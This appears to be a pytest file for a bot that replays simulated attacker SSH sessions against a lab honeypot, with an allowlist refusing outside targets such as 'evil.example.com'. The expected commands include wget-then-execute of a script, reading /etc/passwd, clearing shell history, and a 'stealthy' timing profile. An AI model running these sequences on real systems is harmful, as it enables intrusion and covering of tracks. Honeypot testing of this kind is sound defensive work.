import random
import sys
from pathlib import Path
from unittest import mock

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

import post_login_bot as bot  # noqa: E402


def plan(profile: str, seed: int):
    return bot.build_plan(profile, random.Random(seed), "lab-fileserver")


def test_same_seed_gives_same_plan():
    assert plan("noisy", 1) == plan("noisy", 1)


def test_different_seeds_give_different_plans():
    assert plan("noisy", 1) != plan("noisy", 2)


@pytest.mark.parametrize("profile", ["noisy", "stealthy"])
def test_download_chmod_and_execute_keep_their_order(profile):
    commands = [step.command for step in plan(profile, 7)]
    download = next(i for i, c in enumerate(commands) if c.startswith("wget http://lab-fileserver:8000/"))
    assert commands[download + 1 : download + 3] == ["chmod +x sample.sh", "./sample.sh"]
    assert commands[-1] == "history -c"


def test_noisy_contains_the_full_base_sequence():
    commands = [step.command for step in plan("noisy", 3)]
    for expected in ("uname -a", "cat /proc/cpuinfo", "whoami", "cat /etc/passwd", "ls -la"):
        assert expected in commands


def test_stealthy_is_shorter_and_slower_than_noisy():
    noisy, stealthy = plan("noisy", 5), plan("stealthy", 5)
    assert len(stealthy) < len(noisy)
    assert min(s.delay for s in stealthy) > max(s.delay for s in noisy)


def test_unknown_profile_is_rejected():
    with pytest.raises(ValueError):
        plan("barulhento", 1)


def test_run_session_sends_commands_in_order_and_sleeps_between():
    channel = mock.Mock()
    channel.recv_ready.return_value = False
    client = mock.Mock(invoke_shell=mock.Mock(return_value=channel))
    steps = [bot.Step("whoami", 1.5), bot.Step("ls -la", 2.5)]
    sleeps: list[float] = []
    with mock.patch.object(bot, "read_available", return_value="saída"):
        outputs = bot.run_session(client, steps, sleep=sleeps.append)
    assert [call.args[0] for call in channel.send.call_args_list] == ["whoami\n", "ls -la\n"]
    assert sleeps == [1.5, 2.5]
    assert len(outputs) == 3
    channel.close.assert_called_once()


def test_read_available_returns_received_text():
    channel = mock.Mock()
    channel.recv_ready.side_effect = [True, False, False, False]
    channel.recv.return_value = b"ola"
    assert bot.read_available(channel, idle=0.1) == "ola"


def test_target_outside_allowlist_is_refused_before_any_connection():
    with mock.patch.object(bot, "connect") as connect:
        code = bot.main(["--target", "8.8.8.8"])
    assert code == bot.EXIT_REFUSED
    connect.assert_not_called()


def test_fileserver_outside_allowlist_is_refused():
    with mock.patch.object(bot, "connect") as connect:
        code = bot.main(["--target", "honeypot", "--fileserver", "evil.example.com"])
    assert code == bot.EXIT_REFUSED
    connect.assert_not_called()


def test_connection_failure_returns_failure_code(capsys):
    with mock.patch.object(bot, "connect", side_effect=OSError("recusado")):
        code = bot.main(["--target", "honeypot"])
    assert code == bot.EXIT_FAILURE
    assert "falha ao conectar" in capsys.readouterr().err


def test_main_runs_requested_number_of_sessions():
    client = mock.Mock()
    with mock.patch.object(bot, "connect", return_value=client), \
         mock.patch.object(bot, "run_session") as run_session, \
         mock.patch.object(bot.time, "sleep"):
        code = bot.main(["--target", "honeypot", "--sessions", "3", "--seed", "1"])
    assert code == bot.EXIT_OK
    assert run_session.call_count == 3
    assert client.close.call_count == 3


def test_sessions_must_be_positive():
    with pytest.raises(SystemExit):
        bot.parse_args(["--target", "honeypot", "--sessions", "0"])
